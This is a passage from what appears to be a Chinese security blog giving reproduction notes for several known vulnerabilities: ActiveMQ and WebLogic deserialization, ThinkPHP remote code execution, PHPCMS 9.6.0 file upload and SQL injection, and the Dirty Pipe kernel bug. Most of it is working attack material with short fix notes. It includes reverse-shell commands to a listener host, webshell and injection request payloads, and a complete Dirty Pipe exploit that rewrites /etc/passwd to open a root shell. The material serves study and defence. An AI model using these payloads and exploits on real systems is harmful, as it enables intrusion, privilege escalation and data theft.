class="headerlink" title="step6:ActiveMQ反序列化漏洞"></a>step6:ActiveMQ反序列化漏洞</h2><h3 id="漏洞概述：-5"><a href="#漏洞概述：-5" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>  <a href="https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020">Apache</a> ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，漏洞没有限制在代理中序列化的类，远程攻击者可以借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行恶意代码。</p><h3 id="漏洞影响版本：-5"><a href="#漏洞影响版本：-5" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Apache ActiveMQ 5.13.0之前的版本</p><h3 id="漏洞复现：-5"><a href="#漏洞复现：-5" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>1.漏洞利用过程如下：</p><ul><li>a.构造（可以使用ysoserial）可执行命令的序列化对象</li><li>b.作为一个消息，发送给目标61616端口</li><li>c.访问的Web管理页面，读取消息，触发漏洞</li></ul><p>2.利用jmet进行反弹shell:</p><pre class="line-numbers language-none"><code class="language-none">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljg4LjExMS8xMjM0IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.88.111   61616<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/ActiveMQ%E5%A4%8D%E7%8E%B02.png"> </p><p><img src="/2023/08/19/images1/ActiveMQ%E5%A4%8D%E7%8E%B01.png"></p><p>3.点击创建事件并开启端口监听反弹shell。</p><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/ActiveMQ%E5%A4%8D%E7%8E%B03.png"> </p><p><img src="/2023/08/19/images1/ActiveMQ%E5%A4%8D%E7%8E%B04.png"></p><h3 id="修复方案：-5"><a href="#修复方案：-5" class="headerlink" title="修复方案："></a>修复方案：</h3><ul><li>将ActiveMQ升级到最新版本</li><li>有WAF的可以配置相关规则进行拦截</li></ul><h2 id="step7-thinkphp反序列化漏洞"><a href="#step7-thinkphp反序列化漏洞" class="headerlink" title="step7:thinkphp反序列化漏洞"></a>step7:thinkphp反序列化漏洞</h2><h3 id="漏洞概述：-6"><a href="#漏洞概述：-6" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>ThinkPHP是一款国内流行的开源PHP框架，攻击者可向缓存文件内写入PHP代码，导致远程代码执行。该漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而让攻击者可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞</p><h3 id="漏洞影响版本：-6"><a href="#漏洞影响版本：-6" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>5.x &lt; 5.1.31, &lt;&#x3D; 5.0.23</p><h3 id="漏洞复现：-6"><a href="#漏洞复现：-6" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>1.漏洞利用方式：</p><p>第一种：利用system函数远程命令执行：</p><pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E1.png"></p><p>第二种：通过phpinfo函数写出phpinfo()的信息：</p><pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2.png"></p><p>第三种：利用assert函数进行getshell</p><pre class="line-numbers language-none"><code class="language-none">_method&#x3D;__construct&amp;filter[]&#x3D;assert&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;eval($_POST[&#39;1&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">数据包：GET &#x2F;thinkphp_5.0.22&#x2F;public&#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1Host: 192.168.88.111Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 95_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;eval($_POST[&#39;1&#39;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E3.png"></p><p>2.蚁剑进行链接：</p><p>a.把poc中的参数依次添加到蚁剑中的body参数中</p><p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5.png"></p><p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E4.png"></p><p>getshell成功</p><p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E6.png"></p><h3 id="修复方案：-6"><a href="#修复方案：-6" class="headerlink" title="修复方案："></a>修复方案：</h3><p>升级ThinkPHP至安全版本</p><p>在think\App类的module方法的获取控制器的代码后面加上</p><pre class="line-numbers language-none"><code class="language-none">if (!preg_match(&#39;&#x2F;^[A-Za-z](\w|\.)*$&#x2F;&#39;, $controller)) &#123;    throw new HttpException(404, &#39;controller not exists:&#39; . $controller);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Step8-phpcms9-6-0任意文件上传漏洞"><a href="#Step8-phpcms9-6-0任意文件上传漏洞" class="headerlink" title="Step8:phpcms9.6.0任意文件上传漏洞"></a>Step8:phpcms9.6.0任意文件上传漏洞</h2><h3 id="漏洞概述：-7"><a href="#漏洞概述：-7" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>PHPCMS 9.6.0版本中的libs&#x2F;classes&#x2F;attachment.class.php文件存在漏洞,该漏洞源于PHPCMS程序在下载远程&#x2F;本地文件时没有对文件的类型做正确的校验。远程攻击者可以利用该漏洞上传并执行任意的PHP代码。</p><h3 id="漏洞影响版本：-7"><a href="#漏洞影响版本：-7" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>PHPCMS v9.6.0</p><h3 id="漏洞复现：-7"><a href="#漏洞复现：-7" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>1、会员注册填写信息，bp抓包</p><p><img src="/2023/08/19/images1/phpcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.jpg"></p><p>2、构造payload</p><pre class="line-numbers language-none"><code class="language-none">siteid&#x3D;1&amp;modelid&#x3D;11&amp;username&#x3D;test&amp;password&#x3D;test123456&amp;pwdconfirm&#x3D;test123456&amp;email&#x3D;11111111115%40qq.com&amp;nickname&#x3D;test5&amp;info[content]&#x3D;&lt;img src&#x3D;http:&#x2F;&#x2F;192.168.88.162&#x2F;shell.txt?.php#.jpg&gt;&amp;dosubmit&#x3D;1&amp;protocol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/19/images1/phpcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.jpg"></p><p>3、成功上传</p><p><img src="/2023/08/19/images1/phpcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A03.jpg"></p><p>4、用蚁剑连接成功getshell</p><p><img src="/2023/08/19/images1/phpcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04.jpg"></p><h3 id="修复方案：-7"><a href="#修复方案：-7" class="headerlink" title="修复方案："></a>修复方案：</h3><p>打开phpcms\libs\classes\attachment.class.php</p><p>在168行添加如下代码：</p><pre class="line-numbers language-none"><code class="language-none">if(!stripos($ext,$filename))&#123;    $arryfilename &#x3D; explode(&quot;|&quot;, $ext);    foreach($arryfilename as $n&#x3D;&gt;$fn)&#123;                if($fn)&#123;                       $filename &#x3D; $fn;                        continue;                &#125;     &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="step9-phpcms9-6-0的SQL注入漏洞"><a href="#step9-phpcms9-6-0的SQL注入漏洞" class="headerlink" title="step9:phpcms9.6.0的SQL注入漏洞"></a>step9:phpcms9.6.0的SQL注入漏洞</h2><h3 id="漏洞概述：-8"><a href="#漏洞概述：-8" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>由于&#x2F;modules&#x2F;attachment&#x2F;attachments.php的过滤函数的缺陷导致了可以绕过它的过滤机制形成SQL注入漏洞，可导致数据库中数据泄漏。</p><h3 id="漏洞影响版本：-8"><a href="#漏洞影响版本：-8" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>phpcms9.6.0</p><h3 id="漏洞复现：-8"><a href="#漏洞复现：-8" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>第一步：先拿到cookie</p><pre class="line-numbers language-none"><code class="language-none">数据包如下：GET &#x2F;phpcms&#x2F;install_package&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;a&#x3D;init&amp;siteid&#x3D;1 HTTP&#x2F;1.1Host: 192.168.88.111Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;192.168.88.111&#x2F;phpcms&#x2F;install_package&#x2F;index.php?m&#x3D;member&amp;c&#x3D;content&amp;a&#x3D;upload_videoAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: Hopsm_admin_username&#x3D;a252UtNpgn2aD6sAN5C_lny-hPRsRI6lkl-aGhFxD-fYtsE; Hopsm_siteid&#x3D;c5c5LE-86crjs5-lJPkkybhA4DVK2NsJ5tghFLUV; Hopsm_userid&#x3D;3250N2fKQZQEQXH7QJGLDgmGXUubDRzQ2tBRpvPh; Hopsm_admin_email&#x3D;8a195c21BGr_KpdCGgmXsDJEYt53vc2MjiyoaZsv3IT0YCCe2vZXF__POu5SJcw; Hopsm_sys_lang&#x3D;0155w2UtARl5WtGB3MVN8A3lmL9o2-7dLcQJazZXI0vbUQ; PHPSESSID&#x3D;svanr140i0ilmu0t9epbc63gf7Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/phpcms-sql%E6%B3%A8%E5%85%A51.png"></p><p>第二步：将这个cookie值作为userid_flash的值</p><pre class="line-numbers language-none"><code class="language-none">数据包如下：POST &#x2F;phpcms&#x2F;install_package&#x2F;index.php?m&#x3D;attachment&amp;c&#x3D;attachments&amp;a&#x3D;swfupload_json&amp;aid&#x3D;1&amp;src&#x3D;%26id&#x3D;%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26&amp;XDEBUG_SESSION_START&#x3D;PHPSTORM HTTP&#x2F;1.1Host: 192.168.88.111Connection: closeUser-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit&#x2F;534.50 (KHTML, like Gecko) Version&#x2F;5.1 Safari&#x2F;534.50Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 55userid_flash&#x3D;86a4fopiANPPhau4O8pMCfKO_i_yqusL1jqe2dqV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/phpcms-sql%E6%B3%A8%E5%85%A52.png"></p><p>这里urldecoded的payload为：</p><pre class="line-numbers language-none"><code class="language-none">&amp;id&#x3D;%*27 and updatexml(1,concat(1,(user()),1)#&amp;m&#x3D;1&amp;f&#x3D;haha&amp;modelid&#x3D;2&amp;catid&#x3D;7&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三步:得到wknv_att_json的值，并作为a_k的payload值，得到sql语句执行后的结果。</p><pre class="line-numbers language-none"><code class="language-none">数据包如下：GET &#x2F;phpcms&#x2F;install_package&#x2F;index.php?m&#x3D;content&amp;c&#x3D;down&amp;a_k&#x3D;fc9btacWMhZ-PRawRK0XWj3_wlCoJXnuA8PqbiwS3Y3WOYfVlHgIQxkK1mZljjprx-eUixeTP21L9Eg8bFKaIYxN446pLGPtJMWvX_Ipsm3XQemvklBrkFEPZuhY4VtUfu4G3NtP4gORisPHDgva30VKjyfUeZDR6veE9CqdMcyTumGVYIi2h_M HTTP&#x2F;1.1Host: 192.168.88.111Cache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;98.0.4758.102 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;192.168.88.111&#x2F;phpcms&#x2F;install_package&#x2F;index.php?m&#x3D;member&amp;c&#x3D;content&amp;a&#x3D;upload_videoAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: Hopsm_admin_username&#x3D;a252UtNpgn2aD6sAN5C_lny-hPRsRI6lkl-aGhFxD-fYtsE; Hopsm_siteid&#x3D;c5c5LE-86crjs5-lJPkkybhA4DVK2NsJ5tghFLUV; Hopsm_userid&#x3D;3250N2fKQZQEQXH7QJGLDgmGXUubDRzQ2tBRpvPh; Hopsm_admin_email&#x3D;8a195c21BGr_KpdCGgmXsDJEYt53vc2MjiyoaZsv3IT0YCCe2vZXF__POu5SJcw; Hopsm_sys_lang&#x3D;0155w2UtARl5WtGB3MVN8A3lmL9o2-7dLcQJazZXI0vbUQ; PHPSESSID&#x3D;svanr140i0ilmu0t9epbc63gf7Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/phpcms-sql%E6%B3%A8%E5%85%A53.png"></p><h3 id="修复方案：-8"><a href="#修复方案：-8" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.更新phpcms的版本或者打补丁</p><p>2.修改waf规则</p><p>3.找到配置文件&#x2F;phpcms&#x2F;modules&#x2F;content&#x2F;down.php修改代码17行，89行，120行。</p><pre class="line-numbers language-none"><code class="language-none">17行源码：parse_str($a_k);17行修改后的源码：$a_k &#x3D; safe_replace($a_k); parse_str($a_k);89行源码：、parse_str($a_k);89行修改后的源码：$a_k &#x3D; safe_replace($a_k); parse_str($a_k);120行源码：file_down($fileurl, $filename);120行修改后的源码：$fileurl &#x3D; str_replace(array(‘&lt;‘,’&gt;’), ”,$fileurl); file_down($fileurl, $filename);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/phpcms-sql%E6%B3%A8%E5%85%A54.png"></p><h2 id="step10-linux内核提权漏洞"><a href="#step10-linux内核提权漏洞" class="headerlink" title="step10:linux内核提权漏洞"></a>step10:linux内核提权漏洞</h2><h3 id="漏洞概述：-9"><a href="#漏洞概述：-9" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Linux 内核中的一个权限提升漏洞（CVE-2022-0847，也称为“Dirty Pipe”），允许非特权用户注入和覆盖任意只读文件中的数据，导致权限提升，并最终获得root权限。该漏洞影响了 Linux Kernel 5.8 及更高版本。</p><h3 id="漏洞影响版本：-9"><a href="#漏洞影响版本：-9" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Linux Kernel版本 &gt;&#x3D; 5.8</p><p>Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.10</p><h3 id="漏洞复现：-9"><a href="#漏洞复现：-9" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><pre class="line-numbers language-none"><code class="language-none">vi compile.shgcc exploit.c -o exploit:wq.&#x2F;compile.sh.&#x2F;exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将如下代码保存为exploit.c文件</p><pre class="line-numbers language-none"><code class="language-none">poc如下:&#x2F;* SPDX-License-Identifier: GPL-2.0 *&#x2F;&#x2F;* * Copyright 2022 CM4all GmbH &#x2F; IONOS SE * * author: Max Kellermann &lt;max.kellermann@ionos.com&gt; * * Proof-of-concept exploit for the Dirty Pipe * vulnerability (CVE-2022-0847) caused by an uninitialized * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any * file contents in the page cache, even if the file is not permitted * to be written, immutable or on a read-only mount. * * This exploit requires Linux 5.8 or later; the code path was made * reachable by commit f6dd975583bd (&quot;pipe: merge * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was * there before, it just provided an easy way to exploit it. * * There are two major limitations of this exploit: the offset cannot * be on a page boundary (it needs to write one byte before the offset * to add a reference to this page to the pipe), and the write cannot * cross a page boundary. * * Example: .&#x2F;write_anything &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 1 $&#39;\nssh-ed25519 AAA......\n&#39; * * Further explanation: https:&#x2F;&#x2F;dirtypipe.cm4all.com&#x2F; *&#x2F;#define _GNU_SOURCE#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys&#x2F;stat.h&gt;#include &lt;sys&#x2F;user.h&gt;#ifndef PAGE_SIZE#define PAGE_SIZE 4096#endif&#x2F;** * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the * PIPE_BUF_FLAG_CAN_MERGE flag set. *&#x2F;static void prepare_pipe(int p[2])&#123;if (pipe(p)) abort();const unsigned pipe_size &#x3D; fcntl(p[1], F_GETPIPE_SZ);static char buffer[4096];&#x2F;* fill the pipe completely; each pipe_buffer will now have   the PIPE_BUF_FLAG_CAN_MERGE flag *&#x2F;for (unsigned r &#x3D; pipe_size; r &gt; 0;) &#123;unsigned n &#x3D; r &gt; sizeof(buffer) ? sizeof(buffer) : r;write(p[1], buffer, n);r -&#x3D; n;&#125;&#x2F;* drain the pipe, freeing all pipe_buffer instances (but   leaving the flags initialized) *&#x2F;for (unsigned r &#x3D; pipe_size; r &gt; 0;) &#123;unsigned n &#x3D; r &gt; sizeof(buffer) ? sizeof(buffer) : r;read(p[0], buffer, n);r -&#x3D; n;&#125;&#x2F;* the pipe is now empty, and if somebody adds a new   pipe_buffer without initializing its &quot;flags&quot;, the buffer   will be mergeable *&#x2F;&#125;int main(int argc, char **argv) &#123;const char *const path &#x3D; &quot;&#x2F;etc&#x2F;passwd&quot;;        printf(&quot;Backing up &#x2F;etc&#x2F;passwd to &#x2F;tmp&#x2F;passwd.bak ...\n&quot;);        FILE *f1 &#x3D; fopen(&quot;&#x2F;etc&#x2F;passwd&quot;, &quot;r&quot;);        FILE *f2 &#x3D; fopen(&quot;&#x2F;tmp&#x2F;passwd.bak&quot;, &quot;w&quot;);        if (f1 &#x3D;&#x3D; NULL) &#123;            printf(&quot;Failed to open &#x2F;etc&#x2F;passwd\n&quot;);            exit(EXIT_FAILURE);        &#125; else if (f2 &#x3D;&#x3D; NULL) &#123;            printf(&quot;Failed to open &#x2F;tmp&#x2F;passwd.bak\n&quot;);            fclose(f1);            exit(EXIT_FAILURE);        &#125;        char c;        while ((c &#x3D; fgetc(f1)) !&#x3D; EOF)            fputc(c, f2);        fclose(f1);        fclose(f2);loff_t offset &#x3D; 4; &#x2F;&#x2F; after the &quot;root&quot;const char *const data &#x3D; &quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:&#x2F;root:&#x2F;bin&#x2F;sh\n&quot;; &#x2F;&#x2F; openssl passwd -1 -salt aaron aaron         printf(&quot;Setting root password to \&quot;aaron\&quot;...&quot;);const size_t data_size &#x3D; strlen(data);if (offset % PAGE_SIZE &#x3D;&#x3D; 0) &#123;fprintf(stderr, &quot;Sorry, cannot start writing at a page boundary\n&quot;);return EXIT_FAILURE;&#125;const loff_t next_page &#x3D; (offset | (PAGE_SIZE - 1)) + 1;const loff_t end_offset &#x3D; offset + (loff_t)data_size;if (end_offset &gt; next_page) &#123;fprintf(stderr, &quot;Sorry, cannot write across a page boundary\n&quot;);return EXIT_FAILURE;&#125;&#x2F;* open the input file and validate the specified offset *&#x2F;const int fd &#x3D; open(path, O_RDONLY); &#x2F;&#x2F; yes, read-only! :-)if (fd &lt; 0) &#123;perror(&quot;open failed&quot;);return EXIT_FAILURE;&#125;struct stat st;if (fstat(fd, &amp;st)) &#123;perror(&quot;stat failed&quot;);return EXIT_FAILURE;&#125;if (offset &gt; st.st_size) &#123;fprintf(stderr, &quot;Offset is not inside the file\n&quot;);return EXIT_FAILURE;&#125;if (end_offset &gt; st.st_size) &#123;fprintf(stderr, &quot;Sorry, cannot enlarge the file\n&quot;);return EXIT_FAILURE;&#125;&#x2F;* create the pipe with all flags initialized with   PIPE_BUF_FLAG_CAN_MERGE *&#x2F;int p[2];prepare_pipe(p);&#x2F;* splice one byte from before the specified offset into the   pipe; this will add a reference to the page cache, but   since copy_page_to_iter_pipe() does not initialize the   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set *&#x2F;--offset;ssize_t nbytes &#x3D; splice(fd, &amp;offset, p[1], NULL, 1, 0);if (nbytes &lt; 0) &#123;perror(&quot;splice failed&quot;);return EXIT_FAILURE;&#125;if (nbytes &#x3D;&#x3D; 0) &#123;fprintf(stderr, &quot;short splice\n&quot;);return EXIT_FAILURE;&#125;&#x2F;* the following write will not create a new pipe_buffer, but   will instead write into the page cache, because of the   PIPE_BUF_FLAG_CAN_MERGE flag *&#x2F;nbytes &#x3D; write(p[1], data, data_size);if (nbytes &lt; 0) &#123;perror(&quot;write failed&quot;);return EXIT_FAILURE;&#125;if ((size_t)nbytes &lt; data_size) &#123;fprintf(stderr, &quot;short write\n&quot;);return EXIT_FAILURE;&#125;printf(&quot;It worked!\n&quot;);        system(&quot;&#x2F;bin&#x2F;sh -c &#39;(echo aaron; cat) | su - -c \&quot;&quot;                &quot;echo \\\&quot;Restoring &#x2F;etc&#x2F;passwd from &#x2F;tmp&#x2F;passwd.bak...\\\&quot;;&quot;                &quot;cp &#x2F;tmp&#x2F;passwd.bak &#x2F;etc&#x2F;passwd;&quot;                &quot;echo \\\&quot;Done! Popping shell...\\\&quot;;&quot;                &quot;sleep 2;&quot;                &quot;echo \\\&quot;(run commands now)\\\&quot;;&quot;                &quot;&#x2F;bin&#x2F;sh;&quot; &#x2F;&#x2F; one shold work            &quot;\&quot; root&#39;&quot;);        printf(&quot;system() function call seems to have failed :(\n&quot;);return EXIT_SUCCESS;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/19/images1/linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%831.png"></p><h3 id="修复方案：-9"><a href="#修复方案：-9" class="headerlink" title="修复方案："></a>修复方案：</h3><p>更新升级 Linux 内核到以下安全版本：<br>Linux 内核 &gt;&#x3D; 5.16.11<br>Linux 内核 &gt;&#x3D; 5.15.25<br>Linux 内核 &gt;&#x3D; 5.10.102</p><h2 id="step11-weblogic漏洞反序列化漏洞"><a href="#step11-weblogic漏洞反序列化漏洞" class="headerlink" title="step11:weblogic漏洞反序列化漏洞"></a>step11:weblogic漏洞反序列化漏洞</h2><h3 id="漏洞概述：-10"><a href="#漏洞概述：-10" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>WebLogic WLS组件中存在CVE-2017-10271远程代码执行漏洞，可以构造请求对运行WebLogic<a href="https://cloud.tencent.com/product/tdmq?from=10680">中间件</a>的主机进行攻击，近期发现此漏洞的利用方式为传播挖矿程序。</p><h3 id="漏洞影响版本：-10"><a href="#漏洞影响版本：-10" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>10.3.6.0.0</p><p>12.1.3.0.0</p><p>12.2.1.1.0</p><p>12.2.1.2.0</p><h3 id="漏洞复现：-10"><a href="#漏洞复现：-10" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>第一种方式：直接利用工具</p><p><img src="/2023/08/19/images1/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png"></p><p>第二种：</p><p>首先进行端口监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反弹shell poc：</p><pre class="line-numbers language-none"><code class="language-none">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;&lt;void index&#x3D;&quot;0&quot;&gt;&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void index&#x3D;&quot;1&quot;&gt;&lt;string&gt;-c&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void index&#x3D;&quot;2&quot;&gt;&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.111&#x2F;4444 0&gt;&amp;1&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;&#x2F;array&gt;&lt;void 